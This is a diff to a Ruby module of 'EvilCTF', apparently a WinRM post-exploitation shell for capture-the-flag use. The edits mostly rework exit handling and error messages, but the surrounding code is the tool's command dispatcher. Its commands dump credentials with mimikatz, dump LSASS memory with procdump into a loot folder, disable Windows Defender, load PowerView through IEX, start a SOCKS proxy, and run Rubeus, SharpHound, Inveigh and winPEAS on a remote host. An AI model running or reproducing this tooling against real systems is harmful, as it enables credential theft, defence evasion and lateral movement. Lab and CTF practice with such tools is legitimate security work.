@@ -106,6 +106,12 @@ module EvilCTF::Session
       should_exit = false
 
       loop do
+        # Check global flag at the top of loop (set by Signal.trap in main)
+        if defined?($evil_ctf_should_exit) && $evil_ctf_should_exit
+          should_exit = true
+        end
+        break if should_exit
+
         begin
           Timeout.timeout(1800) do
             prompt = shell.run('prompt').output
@@ -114,8 +120,8 @@ module EvilCTF::Session
             input = input.strip
             next if input.empty?
 
+            # Clean exit commands: set flag, let outer loop handle break
             if input =~ /^(exit|quit|__exit__)$/i
-              # Set exit flag and skip remainder of iteration
               should_exit = true
               next
             end
@@ -152,21 +158,26 @@ module EvilCTF::Session
               puts "\nMacros: #{command_manager.list_macros.join(', ')}"
               puts "Aliases: #{command_manager.list_aliases.join(', ')}"
               next
+
             when /^clear$/i
               system('clear || cls')
               next
+
             when /^tools$/i
               EvilCTF::Tools.list_available_tools
               next
+
             when /^download_missing$/i
               EvilCTF::Tools.download_missing_tools
               next
+
             when /^dump_creds$/i
               EvilCTF::Tools.safe_autostage('mimikatz', shell, session_options, logger)
               EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
               command_manager.expand_macro('dump_creds', shell,
                                            webhook: session_options[:webhook])
               next
+
             when /^lsass_dump$/i
               EvilCTF::Tools.safe_autostage('procdump', shell, session_options, logger)
               command_manager.expand_macro('lsass_dump', shell,
@@ -175,9 +186,11 @@ module EvilCTF::Session
                                      "loot/lsass_#{session_options[:ip]}.dmp",
                                      shell)
               next
+
             when /^fileops$/i
               Uploader.file_operations_menu(shell)
               next
+
             when /^enum(?:\s+(\S+))?$/i
               t = Regexp.last_match(1) || 'basic'
               if t == 'deep'
@@ -194,26 +207,32 @@ module EvilCTF::Session
                                                fresh: session_options[:fresh])
               end
               next
+
             when /^dom_enum$/i
               EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
               shell.run("IEX (Get-Content 'C:\\Users\\Public\\PowerView.ps1' -Raw)")
               EvilCTF::Enums.run_enumeration(shell, type: 'dom', cache: enum_cache,
                                              fresh: session_options[:fresh])
               next
+
             when /^disable_defender$/i
               EvilCTF::Tools.disable_defender(shell)
               next
+
             when /^history$/i
               history.show
               next
+
             when /^history\s+clear$/i
               history.clear
               puts '[+] History cleared'
               next
+
             when /^profile\s+save\s+(\S+)$/i
               name = Regexp.last_match(1)
               EvilCTF::Tools.save_config_profile(name, session_options)
               next
+
             when /^get-unquotedservices$/i
               puts "[*] Getting all unquoted service paths..."
               unquoted_ps = <<~POWERSHELL
@@ -224,6 +243,7 @@ module EvilCTF::Session
               result = shell.run(unquoted_ps)
               puts result.output
               next
+
             when /^tool\s+(\w+)$/i
               key = Regexp.last_match(1)
               if key == 'all'
@@ -258,6 +278,7 @@ module EvilCTF::Session
                       PS
                       result = shell.run(ps_cmd)
                       puts result.output
+
                     when 'winpeas'
                       puts "[*] Executing winpeas..."
                       ps_cmd = <<~PS
@@ -276,6 +297,7 @@ module EvilCTF::Session
                       PS
                       result = shell.run(ps_cmd)
                       puts result.output
+
                     when 'procdump'
                       puts "[*] Executing procdump..."
                       ps_cmd = <<~PS
@@ -294,6 +316,7 @@ module EvilCTF::Session
                       PS
                       result = shell.run(ps_cmd)
                       puts result.output
+
                     when 'rubeus', 'seatbelt'
                       puts "[*] Executing #{key}..."
                       ps_cmd = <<~PS
@@ -312,16 +335,19 @@ module EvilCTF::Session
                       PS
                       result = shell.run(ps_cmd)
                       puts result.output
+
                     when 'inveigh', 'powerview', 'sharphound'
                       puts "[*] Executing #{key} PowerShell script..."
                       ps_script = "IEX (Get-Content '#{remote_path}' -Raw) 2>&1"
                       result = shell.run(ps_script)
                       puts result.output
+
                     when 'socksproxy'
                       puts "[*] Executing SOCKS proxy PowerShell module..."
                       ps_script = "Import-Module '#{remote_path}' 2>&1; Invoke-SocksProxy -Port 1080"
                       result = shell.run(ps_script)
                       puts result.output
+
                     else
                       if remote_path.end_with?('.exe')
                         puts "[*] Executing #{key}..."
@@ -350,6 +376,7 @@ module EvilCTF::Session
                   puts "[-] Failed to stage tool '#{key}'"
                 end
               end
+
             when /^!bash$/i, /^!sh$/i
               puts '[*] Spawning local shell. Type "exit" to return.'
               system(ENV['SHELL'] || '/bin/bash')
@@ -386,22 +413,22 @@ module EvilCTF::Session
           should_exit = true
         rescue => e
           # Handle connection errors gracefully
-          if e.is_a?(WinRM::WinRMAuthorizationError) || e.is_a?(Net::HTTPServerException)
+          if e.is_a?(WinRM::WinRMAuthorizationError) || (defined?(Net::HTTPServerException) && e.is_a?(Net::HTTPServerException))
             puts "[!] WARNING - Connection lost: #{e.message}"
             puts "  This may indicate: session timeout, network issues, or firewall changes"
             should_exit = true
-          elsif e.is_a?(WinRM::WinRMEndpointError)
+          elsif defined?(WinRM::WinRMEndpointError) && e.is_a?(WinRM::WinRMEndpointError)
             puts "[!] WARNING - Connection failed: #{e.message}"
             puts "  This may indicate WinRM service not running or firewall blocking access"
-          elsif e.is_a?(WinRM::WinRMAuthenticationError)
+          elsif defined?(WinRM::WinRMAuthenticationError) && e.is_a?(WinRM::WinRMAuthenticationError)
             puts "[!] WARNING - Authentication failed: #{e.message}"
             puts "  Check credentials or Kerberos configuration"
             should_exit = true
-          elsif e.is_a?(WinRM::WinRMTransportError)
+          elsif defined?(WinRM::WinRMTransportError) && e.is_a?(WinRM::WinRMTransportError)
             puts "[!] WARNING - Transport error: #{e.message}"
             puts "  Possible SSL/TLS or proxy issues"
           else
-            puts "[!] WARNING - Session error: #{e.message}"
+            puts "[!] WARNING - Session error: #{e.class}: #{e.message}"
           end
 
           # Safe reconnect logic
@@ -413,11 +440,6 @@ module EvilCTF::Session
           end
         end
 
-        # Honor global exit flag from main (Signal.trap)
-        if defined?($evil_ctf_should_exit) && $evil_ctf_should_exit
-          should_exit = true
-        end
-
         break if should_exit   # ensure outer loop exits
       end
 
@@ -426,7 +448,7 @@ module EvilCTF::Session
       shell.close if shell
     rescue => e
       # Enhanced error handling for connection creation failures
-      puts "[!] WARNING - Failed to create PowerShell session: #{e.message}"
+      puts "[!] WARNING - Failed to create PowerShell session: #{e.class}: #{e.message}"
       puts "  This may indicate: network issues, firewall blocking, WinRM misconfig, or auth problems"
 
       # Attempt to reconnect if possible
